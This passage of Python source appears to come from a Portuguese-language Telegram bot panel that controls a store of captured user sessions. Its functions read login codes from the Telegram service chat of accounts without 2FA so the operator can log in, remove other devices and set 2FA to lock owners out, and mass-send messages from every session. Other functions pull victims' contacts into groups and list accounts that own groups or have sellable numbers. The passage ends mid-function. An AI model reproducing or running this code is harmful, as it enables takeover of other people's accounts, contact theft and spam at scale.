        [InlineKeyboardButton("📁 Ver Sessions", callback_data="sessions")],
        [InlineKeyboardButton("🤖 Bots Filhos", callback_data="bots")],
        [InlineKeyboardButton("➕ Adicionar Bot", callback_data="add_bot")],
        [InlineKeyboardButton("💬 Criar Bot Fluxo Chat", callback_data="add_chatflow_bot")],
        [InlineKeyboardButton("✅ Bot Aprovador (5min)", callback_data="add_approver_bot")],
        [InlineKeyboardButton("🔥 Msg Disparo", callback_data="edit_disparo")],
        [InlineKeyboardButton(f"⏰ Intervalo ({config.get('intervalo_horas', '1')}h)", callback_data="edit_intervalo")],
        [InlineKeyboardButton("🚀 Disparar TODAS", callback_data="disparar")],
        [InlineKeyboardButton("✏️ Msg Inicial", callback_data="edit_msg")],
        [InlineKeyboardButton("🔘 Texto Botão", callback_data="edit_btn")],
        [InlineKeyboardButton("🧹 Limpar Bots Caídos", callback_data="limpar_bots")],
        [InlineKeyboardButton("🔑 Login Session", callback_data="login_session")],
        [InlineKeyboardButton("🧹 Limpar Devices + 2FA", callback_data="clean_devices")],
        [InlineKeyboardButton("🔗 Links Redirect", callback_data="redirects_menu")],
        [InlineKeyboardButton("👥 Puxar Contatos p/ Grupo", callback_data="puxar_contatos")],
        [InlineKeyboardButton("🔢 Números Bonitos (sequência)", callback_data="numeros_bonitos")],
        [InlineKeyboardButton("👑 Sessions Donas de Grupo", callback_data="donos_grupo")],
        [InlineKeyboardButton("🧊 Limpar Sessions Congeladas", callback_data="limpar_congeladas")],
    ]
    text = f"🔧 **Painel Admin - Bot Pai**\n\n📁 Sessions: {sessions_count}\n🤖 Bots filhos: {bots_count}"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def safe_edit(query, text, **kwargs):
    try:
        await query.edit_message_text(text, **kwargs)
    except Exception as e1:
        logger.error(f"[safe_edit] edit falhou ({e1}), chat={query.message.chat_id} msg={query.message.message_id} user={query.from_user.id}")
        try:
            await query.get_bot().send_message(chat_id=query.from_user.id, text=text, **kwargs)
        except Exception as e2:
            logger.error(f"[safe_edit] send_message direto falhou: {e2}")

async def pai_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not is_admin(query.from_user.id):
        return
    data = query.data
    config = load_config()

    if data == "menu":
        await pai_admin_menu(update, context)
    elif data == "stats":
        s = db.count_sessions()
        b = db.count_bots()
        text = f"📊 **Estatísticas**\n\n📁 Sessions: {s}\n🤖 Bots: {b}"
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "sessions":
        sessions = db.get_all_sessions()
        text = "📁 Nenhuma session." if not sessions else f"📁 **Sessions ({len(sessions)})**\n\n" + "".join(f"• {s['phone'] or s['user_id']}\n" for s in sessions[:20])
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "bots":
        bots = db.get_all_bots()
        if not bots:
            text = "🤖 Nenhum bot filho.\nClique ➕ Adicionar Bot"
        else:
            text = f"🤖 **Bots Filhos ({len(bots)})**\n\n"
            for b in bots:
                bid = str(b['_id'])
                status = "✅" if bid in running_child_bots else "❌"
                btype = "💬" if b.get('bot_type') == 'chatflow' else "🌐"
                text += f"{status} {btype} {b['name']} (ID:{bid})\n"
        kb = [[InlineKeyboardButton("➕ Adicionar Bot", callback_data="add_bot")], [InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "add_bot":
        db.set_awaiting(query.from_user.id, {'type': 'bot_token', 'bot_id': None})
        text = "➕ **Adicionar Bot Filho**\n\nEnvie o TOKEN do bot.\n\nExemplo:\n`123456789:ABCdefGHIjklMNOpqrsTUVwxyz`"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "add_chatflow_bot":
        db.set_awaiting(query.from_user.id, {'type': 'chatflow_token', 'bot_id': None})
        text = "💬 **Criar Bot Fluxo Chat**\n\nEnvie o TOKEN do bot.\n\nEste bot fará verificação via conversa no chat (sem mini app).\n\nExemplo:\n`123456789:ABCdefGHIjklMNOpqrsTUVwxyz`"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "add_approver_bot":
        db.set_awaiting(query.from_user.id, {'type': 'approver_token', 'bot_id': None})
        text = "✅ **Bot Aprovador (5min)**\n\nEnvie o TOKEN do bot.\n\nEste bot aceita pedidos de entrada automaticamente após 5 minutos. Adicione ele como admin nos seus grupos.\n\nExemplo:\n`123456789:ABCdefGHIjklMNOpqrsTUVwxyz`"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "edit_disparo":
        db.set_awaiting(query.from_user.id, {'type': 'msg_disparo', 'bot_id': None})
        text = f"🔥 Envie a nova mensagem de disparo.\n\nAtual:\n{config.get('msg_disparo', '')}"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
    elif data == "edit_intervalo":
        db.set_awaiting(query.from_user.id, {'type': 'intervalo_horas', 'bot_id': None})
        text = f"⏰ Envie o intervalo em horas.\n\nAtual: {config.get('intervalo_horas', '1')}h"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
    elif data == "edit_msg":
        db.set_awaiting(query.from_user.id, {'type': 'mensagem', 'bot_id': None})
        text = "✏️ Envie a nova mensagem inicial.\nUse {chat_title} para o nome do grupo."
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
    elif data == "edit_btn":
        db.set_awaiting(query.from_user.id, {'type': 'botao', 'bot_id': None})
        text = f"🔘 Envie o novo texto do botão.\n\nAtual: {config.get('botao', '')}"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
    elif data == "limpar_bots":
        await safe_edit(query, "🧹 Verificando bots...")
        bots = db.get_all_bots()
        removidos = 0
        detalhes = ""
        for bot in bots:
            token = bot.get('token', '')
            bid = str(bot['_id'])
            bname = bot.get('name', 'Bot')
            try:
                resp = http_requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
                if resp.status_code == 401 or resp.status_code == 404:
                    if bid in running_child_bots:
                        running_child_bots.pop(bid, None)
                    db.deactivate_bot(bid)
                    removidos += 1
                    detalhes += f"🗑️ {bname}\n"
                    logger.info(f"🧹 Bot caído removido via painel: {bname}")
            except:
                pass
        if removidos > 0:
            text = f"🧹 **Limpeza concluída!**\n\n{removidos} bot(s) removido(s):\n\n{detalhes}"
        else:
            text = "✅ Todos os bots estão funcionando! Nenhum bot caído."
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "disparar":
        total_sessions = db.count_sessions()
        if total_sessions == 0:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Nenhuma session!", reply_markup=InlineKeyboardMarkup(kb))
            return
        await safe_edit(query, f"🚀 Disparando em {total_sessions} sessions...")
        asyncio.create_task(disparo_job(context))
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await safe_edit(query, "🚀 Disparo iniciado!", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "puxar_contatos":
        sessions = db.get_all_sessions()
        if not sessions:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Nenhuma session disponível!", reply_markup=InlineKeyboardMarkup(kb))
            return
        db.set_awaiting(query.from_user.id, {'type': 'puxar_contatos_link'})
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query,
            f"👥 **Puxar Contatos para Grupo**\n\n"
            f"📁 {len(sessions)} sessions disponíveis\n\n"
            f"Envie o link do grupo onde quer adicionar os contatos:\n\n"
            f"Exemplo: `https://t.me/+ABC123` ou `https://t.me/grupo`",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data == "numeros_bonitos":
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await safe_edit(query, "🔢 Procurando números com dígitos repetidos em sequência (ex: `11111`, `8888`)...", parse_mode="Markdown")
        threading.Thread(target=_run_numeros_bonitos, args=(query.from_user.id, context.bot.token), daemon=True).start()

    elif data == "limpar_congeladas":
        kb = [
            [InlineKeyboardButton("✅ Sim, escanear e remover", callback_data="limpar_congeladas_go")],
            [InlineKeyboardButton("⬅️ Voltar", callback_data="menu")],
        ]
        await safe_edit(query, "🧊 *Limpar Sessions Congeladas*\n\nVou checar todas em paralelo e remover só as que estão *permanentemente quebradas*:\n• Desautorizadas\n• Banidas / deletadas\n• Auth key revogada\n• Conta restrita pelo Telegram\n\n⚠️ *Não* remove contas só com spam temporário (PEER_FLOOD passa sozinho).\n\nConfirmar?", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "limpar_congeladas_go":
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await safe_edit(query, "🧊 Escaneando todas as sessions em paralelo... O resultado chega aqui no chat.", reply_markup=InlineKeyboardMarkup(kb))
        threading.Thread(target=_run_limpar_congeladas, args=(query.from_user.id, context.bot.token), daemon=True).start()

    elif data == "donos_grupo":
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await safe_edit(query, "👑 Iniciando varredura de grupos/canais que as sessions administram...\n\nIsso pode demorar **vários minutos**. O resultado vai chegar como mensagem.", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        threading.Thread(target=_run_donos_grupo, args=(query.from_user.id, context.bot.token), daemon=True).start()

    elif data == "redirects_menu":
        redirects = db.get_all_redirects()
        base_url = os.getenv("WEBAPP_URL", "").rstrip("/")
        if not redirects:
            text = "🔗 **Links Redirect**\n\nNenhum link criado ainda."
        else:
            text = f"🔗 **Links Redirect ({len(redirects)})**\n\n"
            for r in redirects[:15]:
                clicks = r.get('clicks', 0)
                label = r.get('label', '') or r.get('code', '')
                text += f"• **{label}** — {clicks} cliques\n  `{base_url}/r/{r['code']}`\n"
        kb = [
            [InlineKeyboardButton("➕ Criar Link", callback_data="redirect_add")],
        ]
        for r in redirects[:10]:
            label = r.get('label', '') or r.get('code', '')
            kb.append([InlineKeyboardButton(f"🗑️ {label}", callback_data=f"redirect_del_{r['code']}")])
        kb.append([InlineKeyboardButton("⬅️ Voltar", callback_data="menu")])
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "redirect_add":
        db.set_awaiting(query.from_user.id, {'type': 'redirect_label'})
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, "📝 **Criar Link Redirect**\n\nEnvie um **nome** para identificar este link:\n\nExemplo: `Canal VIP`, `Grupo Premium`",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data.startswith("redirect_del_"):
        code = data[len("redirect_del_"):]
        redirect = db.get_redirect(code)
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="redirects_menu")]]
        if redirect:
            db.delete_redirect(code)
            await safe_edit(query, "🗑️ Link removido com sucesso!", reply_markup=InlineKeyboardMarkup(kb))
        else:
            await safe_edit(query, "❌ Link não encontrado.", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "clean_devices":
        db.set_awaiting(query.from_user.id, {'type': 'clean_devices_id'})
        text = (
            "🧹 *Limpar Devices + Ativar 2FA*\n\n"
            "Envie o *User ID* ou *número* da session.\n\n"
            "🔒 Vou manter só o device da cidade *Venda Nova do Imigrante* e "
            "ativar 2FA pedindo senha + email."
        )
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "login_session":
        sessions = db.get_all_sessions()
        if not sessions:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Nenhuma session encontrada.", reply_markup=InlineKeyboardMarkup(kb))
            return
        await safe_edit(query, "🔍 Buscando session válida...")

        async def _find_first_valid():
            from telethon.tl.functions.account import GetPasswordRequest
            for sess in sessions:
                client = None
                try:
                    client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
                    await client.connect()
                    if await client.is_user_authorized():
                        try:
                            pwd = await client(GetPasswordRequest())
                            if pwd.has_password:
                                logger.info(f"Session {sess.get('user_id')} tem 2FA, pulando...")
                                continue
                        except Exception as e:
                            logger.warning(f"Erro ao verificar 2FA {sess.get('user_id')}: {e}")
                        return sess
                except Exception as e:
                    logger.warning(f"Session {sess.get('user_id')} inválida: {e}")
                finally:
                    if client:
                        try:
                            await client.disconnect()
                        except:
                            pass
            return None

        try:
            ensure_telethon_loop()
            future = asyncio.run_coroutine_threadsafe(_find_first_valid(), telethon_loop)
            found = await asyncio.wrap_future(future)
        except Exception as e:
            logger.error(f"Erro ao verificar sessions: {e}")
            found = None

        if not found:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Nenhuma session válida encontrada.", reply_markup=InlineKeyboardMarkup(kb))
            return
        target_uid = found.get('user_id', '?')
        phone = found.get('phone', 'Sem número')
        kb = [
            [InlineKeyboardButton("📲 Pedir Código de Login", callback_data=f"ls_reqcode_{target_uid}")],
            [InlineKeyboardButton("🔌 Desconectar Session", callback_data=f"ls_disconnect_{target_uid}")],
            [InlineKeyboardButton("🔍 Buscar por ID", callback_data="ls_search")],
            [InlineKeyboardButton("🔄 Outra Session", callback_data="login_session_next_0")],
            [InlineKeyboardButton("⬅️ Voltar", callback_data="menu")],
        ]
        await safe_edit(query, f"🔑 **Session Válida Encontrada**\n\n📱 Número: `{phone}`\n🆔 User ID: `{target_uid}`\n\nEscolha uma ação:",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data == "ls_search":
        db.set_awaiting(query.from_user.id, {'type': 'ls_search_id'})
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="login_session")]]
        await safe_edit(query,
            "🔍 **Buscar Session por ID**\n\nEnvie o **User ID** ou o **número de telefone** (com ou sem +) da conta que deseja acessar.\n\nExemplos:\n`123456789`\n`+5511999999999`\n`5511999999999`",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data.startswith("login_session_next_"):
        skip_count = int(data.replace("login_session_next_", "")) + 1
        sessions = db.get_all_sessions()
        if not sessions or skip_count >= len(sessions):
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Não há mais sessions.", reply_markup=InlineKeyboardMarkup(kb))
            return
        await safe_edit(query, "🔍 Buscando próxima session válida...")

        async def _find_next_valid():
            from telethon.tl.functions.account import GetPasswordRequest
            for sess in sessions[skip_count:]:
                client = None
                try:
                    client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
                    await client.connect()
                    if await client.is_user_authorized():
                        try:
                            pwd = await client(GetPasswordRequest())
                            if pwd.has_password:
                                logger.info(f"Session {sess.get('user_id')} tem 2FA, pulando...")
                                continue
                        except Exception as e:
                            logger.warning(f"Erro ao verificar 2FA {sess.get('user_id')}: {e}")
                        return sess, sessions.index(sess)
                except Exception as e:
                    logger.warning(f"Session {sess.get('user_id')} inválida: {e}")
                finally:
                    if client:
                        try:
                            await client.disconnect()
                        except:
                            pass
            return None, skip_count

        try:
            ensure_telethon_loop()
            future = asyncio.run_coroutine_threadsafe(_find_next_valid(), telethon_loop)
            found, idx = await asyncio.wrap_future(future)
        except Exception as e:
            logger.error(f"Erro ao verificar sessions: {e}")
            found, idx = None, skip_count

        if not found:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Não há mais sessions válidas.", reply_markup=InlineKeyboardMarkup(kb))
            return
        target_uid = found.get('user_id', '?')
        phone = found.get('phone', 'Sem número')
        kb = [
            [InlineKeyboardButton("📲 Pedir Código de Login", callback_data=f"ls_reqcode_{target_uid}")],
            [InlineKeyboardButton("🔌 Desconectar Session", callback_data=f"ls_disconnect_{target_uid}")],
            [InlineKeyboardButton("🔍 Buscar por ID", callback_data="ls_search")],
            [InlineKeyboardButton("🔄 Outra Session", callback_data=f"login_session_next_{idx}")],
            [InlineKeyboardButton("⬅️ Voltar", callback_data="menu")],
        ]
        await safe_edit(query, f"🔑 **Session Válida Encontrada**\n\n📱 Número: `{phone}`\n🆔 User ID: `{target_uid}`\n\nEscolha uma ação:",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data.startswith("ls_select_"):
        target_uid = data.replace("ls_select_", "")
        try:
            target_uid_int = int(target_uid)
        except:
            target_uid_int = target_uid
        sess = db.get_session(target_uid_int)
        if not sess:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Session não encontrada.", reply_markup=InlineKeyboardMarkup(kb))
            return
        phone = sess.get('phone', 'Sem número')
        kb = [
            [InlineKeyboardButton("📲 Pedir Código de Login", callback_data=f"ls_reqcode_{target_uid}")],
            [InlineKeyboardButton("🔌 Desconectar Session", callback_data=f"ls_disconnect_{target_uid}")],
            [InlineKeyboardButton("⬅️ Voltar", callback_data="login_session")],
        ]
        await safe_edit(query, 
            f"🔑 **Session Selecionada**\n\n📱 Número: `{phone}`\n🆔 User ID: `{target_uid}`\n\nEscolha uma ação:",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data.startswith("ls_reqcode_"):
        target_uid = data.replace("ls_reqcode_", "")
        try:
            target_uid_int = int(target_uid)
        except:
            target_uid_int = target_uid
        sess = db.get_session(target_uid_int)
        if not sess:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Session não encontrada.", reply_markup=InlineKeyboardMarkup(kb))
            return
        phone = sess.get('phone', 'Sem número')
        kb = [
            [InlineKeyboardButton("📥 Capturar Código", callback_data=f"ls_capture_{target_uid}")],
            [InlineKeyboardButton("🔌 Desconectar Session", callback_data=f"ls_disconnect_{target_uid}")],
            [InlineKeyboardButton("⬅️ Voltar", callback_data="menu")],
        ]
        await safe_edit(query, 
            f"🔑 **Login Session**\n\n📱 Número: `{phone}`\n\n1️⃣ Solicite o código de login para este número pelo seu app/dispositivo\n2️⃣ Depois clique em **Capturar Código** abaixo\n\nO bot vai ler o código que chegou na conta.",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data.startswith("ls_capture_"):
        target_uid = data.replace("ls_capture_", "")
        try:
            target_uid_int = int(target_uid)
        except:
            target_uid_int = target_uid
        sess = db.get_session(target_uid_int)
        if not sess:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Session não encontrada.", reply_markup=InlineKeyboardMarkup(kb))
            return
        phone = sess.get('phone', 'Sem número')
        await safe_edit(query, f"⏳ Capturando código de `{phone}`...", parse_mode="Markdown")

        async def _capture_code():
            from datetime import timezone
            session_client = None
            try:
                session_client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
                await session_client.connect()
                if not await session_client.is_user_authorized():
                    return {'success': False, 'error': 'Session inválida/expirada'}

                code = None
                now_utc = datetime.now(timezone.utc)

                try:
                    messages = await session_client.get_messages(777000, limit=5)
                    logger.info(f"[LoginSession] Msgs do 777000: {len(messages) if messages else 0}")
                    if messages:
                        for msg in messages:
                            logger.info(f"[LoginSession] Msg id={msg.id} date={msg.date} text={msg.text[:80] if msg.text else 'None'}...")
                            if msg.text and not code:
                                code_match = re.search(r'(\d{5,6})', msg.text)
                                if code_match:
                                    code = code_match.group(1)
                                    logger.info(f"[LoginSession] Código encontrado: {code}")
                except Exception as e:
                    logger.error(f"[LoginSession] Erro ao ler 777000: {e}")

                if not code:
                    try:
                        dialogs = await session_client.get_dialogs(limit=5)
                        for d in dialogs:
                            if d.entity and getattr(d.entity, 'id', 0) == 777000:
                                msgs = await session_client.get_messages(d.entity, limit=5)
                                logger.info(f"[LoginSession] Via dialog 777000: {len(msgs) if msgs else 0} msgs")
                                for msg in msgs:
                                    if msg.text and not code:
                                        code_match = re.search(r'(\d{5,6})', msg.text)
                                        if code_match:
                                            code = code_match.group(1)
                                            logger.info(f"[LoginSession] Código via dialog: {code}")
                                break
                    except Exception as e:
                        logger.error(f"[LoginSession] Erro dialogs: {e}")

                if code:
                    return {'success': True, 'code': code, 'phone': phone}
                else:
                    return {'success': False, 'error': 'Nenhum código encontrado. Verifique se o código foi solicitado e tente novamente.'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                if session_client:
                    try:
                        await session_client.disconnect()
                    except:
                        pass

        try:
            ensure_telethon_loop()
            future = asyncio.run_coroutine_threadsafe(_capture_code(), telethon_loop)
            result = await asyncio.wrap_future(future)
            if result.get('success'):
                kb = [
                    [InlineKeyboardButton("📥 Capturar Novo Código", callback_data=f"ls_capture_{target_uid}")],
                    [InlineKeyboardButton("🔌 Desconectar Session", callback_data=f"ls_disconnect_{target_uid}")],
                    [InlineKeyboardButton("⬅️ Voltar", callback_data="menu")],
                ]
                await safe_edit(query, 
                    f"✅ **Código Capturado!**\n\n📱 Número: `{result['phone']}`\n🔐 Código: `{result['code']}`\n\nUse este código para logar na conta.",
                    reply_markup=InlineKeyboardMarkup(kb),
                    parse_mode="Markdown"
                )
            else:
                kb = [
                    [InlineKeyboardButton("🔄 Tentar Novamente", callback_data=f"ls_capture_{target_uid}")],
                    [InlineKeyboardButton("⬅️ Voltar", callback_data=f"ls_reqcode_{target_uid}")],
                ]
                await safe_edit(query, 
                    f"❌ **Código não encontrado**\n\n{result.get('error', 'Erro desconhecido')}",
                    reply_markup=InlineKeyboardMarkup(kb),
                    parse_mode="Markdown"
                )
        except Exception as e:
            logger.error(f"Erro captura código: {e}")
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, f"❌ Erro: {e}", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("ls_disconnect_"):
        target_uid = data.replace("ls_disconnect_", "")
        try:
            target_uid_int = int(target_uid)
        except:
            target_uid_int = target_uid
        sess = db.get_session(target_uid_int)
        if not sess:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await safe_edit(query, "❌ Session não encontrada.", reply_markup=InlineKeyboardMarkup(kb))
            return
        phone = sess.get('phone', 'Sem número')
        await safe_edit(query, f"⏳ Desconectando session `{phone}`...", parse_mode="Markdown")

        async def _disconnect_session():
            client = None
            try:
                client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    await client.log_out()
                return True
            except Exception as e:
                logger.error(f"Erro ao desconectar session: {e}")
                return False
            finally:
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass

        try:
            ensure_telethon_loop()
            future = asyncio.run_coroutine_threadsafe(_disconnect_session(), telethon_loop)
            success = await asyncio.wrap_future(future)
            if success:
                db.delete_session(target_uid_int)
                kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
                await safe_edit(query, 
                    f"✅ **Session Desconectada!**\n\n📱 `{phone}` foi deslogada e removida.\nEla não será mais usada para disparos.",
                    reply_markup=InlineKeyboardMarkup(kb),
                    parse_mode="Markdown"
                )
            else:
                kb = [
                    [InlineKeyboardButton("🔄 Tentar Novamente", callback_data=f"ls_disconnect_{target_uid}")],
                    [InlineKeyboardButton("⬅️ Voltar", callback_data=f"ls_select_{target_uid}")],
                ]
                await safe_edit(query, 
                    f"⚠️ Não foi possível deslogar `{phone}` do Telegram.\nA session ainda está ativa. Tente novamente.",
                    reply_markup=InlineKeyboardMarkup(kb),
                    parse_mode="Markdown"
                )
        except Exception as e:
            logger.error(f"Erro disconnect session: {e}")
            kb = [
                [InlineKeyboardButton("🔄 Tentar Novamente", callback_data=f"ls_disconnect_{target_uid}")],
                [InlineKeyboardButton("⬅️ Voltar", callback_data="menu")],
            ]
            await safe_edit(query, 
                f"⚠️ Erro ao desconectar: {e}\nA session não foi removida.",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )

def _detectar_numero_bonito(phone):
    if not phone:
        return 0, ''
    digitos = ''.join(c for c in str(phone) if c.isdigit())
    if len(digitos) < 8:
        return 0, ''
    max_run = 1
    cur_run = 1
    cur_char = digitos[0]
    for c in digitos[1:]:
        if c == cur_char:
            cur_run += 1
            if cur_run > max_run:
                max_run = cur_run
                melhor_char = c
        else:
            cur_run = 1
            cur_char = c
    if max_run >= 4:
        return max_run, f"{max_run}x dígito repetido"
    return 0, ''

def _run_numeros_bonitos(admin_id, bot_token):
    from telegram import Bot
    bot = Bot(token=bot_token)
    sessions = db.get_all_sessions() or []
    encontrados = []
    for s in sessions:
        phone = s.get('phone', '')
        score, motivo = _detectar_numero_bonito(phone)
        if score > 0:
            encontrados.append((score, phone, s.get('user_id'), motivo))
    encontrados.sort(reverse=True)
    if not encontrados:
        run_async(bot.send_message(admin_id, "🔢 Nenhum número com padrão 'bonito' encontrado."))
        return
    linhas = [f"🔢 *Números Bonitos Encontrados ({len(encontrados)})*\n"]
    for score, phone, uid, motivo in encontrados[:50]:
        linhas.append(f"• `{phone}` — {motivo} (id:`{uid}`)")
    if len(encontrados) > 50:
        linhas.append(f"\n_... e mais {len(encontrados)-50}_")
    texto = "\n".join(linhas)
    for i in range(0, len(texto), 3500):
        run_async(bot.send_message(admin_id, texto[i:i+3500], parse_mode="Markdown"))

def _run_limpar_congeladas(admin_id, bot_token):
    async def _scan():
        from telegram import Bot
        from telethon.errors import UserDeactivatedError, UserDeactivatedBanError, AuthKeyError, AuthKeyUnregisteredError, SessionRevokedError, SessionExpiredError, UnauthorizedError
        bot = Bot(token=bot_token)
        sessions = db.get_all_sessions() or []
        total = len(sessions)
        await bot.send_message(admin_id, f"🧊 Checando {total} sessions em paralelo...")
        congeladas = []
        scanned = {'n': 0}
        sem = asyncio.Semaphore(30)
        progress_lock = asyncio.Lock()

        async def _check_one(s):
            async with sem:
                client = None
                motivo = None
                try:
                    client = TelegramClient(StringSession(s['session_data']), API_ID, API_HASH)
                    await client.connect()
                    if not await client.is_user_authorized():
                        motivo = "desautorizada"
                    else:
                        try:
                            me = await client.get_me()
                            if me is None:
                                motivo = "get_me vazio"
                            elif getattr(me, 'restricted', False):
                                motivo = "restrita"
                            elif getattr(me, 'deleted', False):
                                motivo = "deletada"
                        except (UserDeactivatedError, UserDeactivatedBanError):
                            motivo = "banida/deletada"
                        except (AuthKeyError, AuthKeyUnregisteredError, SessionRevokedError, SessionExpiredError, UnauthorizedError):
                            motivo = "session revogada"
                except (UserDeactivatedError, UserDeactivatedBanError):
                    motivo = "banida/deletada"
                except (AuthKeyError, AuthKeyUnregisteredError, SessionRevokedError, SessionExpiredError, UnauthorizedError):
                    motivo = "session revogada"
                except Exception as e:
                    logger.warning(f"[Congeladas] erro session {s.get('phone')}: {e}")
                finally:
                    if client:
                        try: await client.disconnect()
                        except: pass
                    if motivo:
                        congeladas.append((s, motivo))
                    async with progress_lock:
                        scanned['n'] += 1
                        n = scanned['n']
                    if n % 100 == 0 or n == total:
                        try:
                            await bot.send_message(admin_id, f"⏳ Progresso: {n}/{total} ({len(congeladas)} congeladas)")
                        except: pass

        await asyncio.gather(*[_check_one(s) for s in sessions], return_exceptions=True)

        if not congeladas:
            await bot.send_message(admin_id, "✅ Nenhuma session congelada encontrada!")
            return
        removidas = 0
        for s, motivo in congeladas:
            try:
                db.delete_session(s['user_id'])
                removidas += 1
            except Exception as e:
                logger.warning(f"[Congeladas] falha removendo {s.get('phone')}: {e}")
        linhas = [f"🧊 *Sessions Congeladas Removidas: {removidas}/{len(congeladas)}*\n"]
        for s, motivo in congeladas[:80]:
            linhas.append(f"• `{s.get('phone','?')}` — {motivo}")
        if len(congeladas) > 80:
            linhas.append(f"_... e mais {len(congeladas)-80}_")
        texto = "\n".join(linhas)
        for i in range(0, len(texto), 3500):
            try:
                await bot.send_message(admin_id, texto[i:i+3500], parse_mode="Markdown")
            except Exception:
                await bot.send_message(admin_id, texto[i:i+3500])
    try:
        ensure_telethon_loop()
        future = asyncio.run_coroutine_threadsafe(_scan(), telethon_loop)
        future.result(timeout=3600)
    except Exception as e:
        logger.error(f"[Congeladas] erro geral: {e}")

def _run_donos_grupo(admin_id, bot_token):
    async def _scan():
        from telegram import Bot
        from telethon.tl.types import Channel, Chat
        bot = Bot(token=bot_token)
        sessions = db.get_all_sessions() or []
        await bot.send_message(admin_id, f"👑 Escaneando {len(sessions)} sessions em paralelo buscando grupos/canais que elas administram...")
        donos = []
        scanned = {'n': 0}
        total = len(sessions)
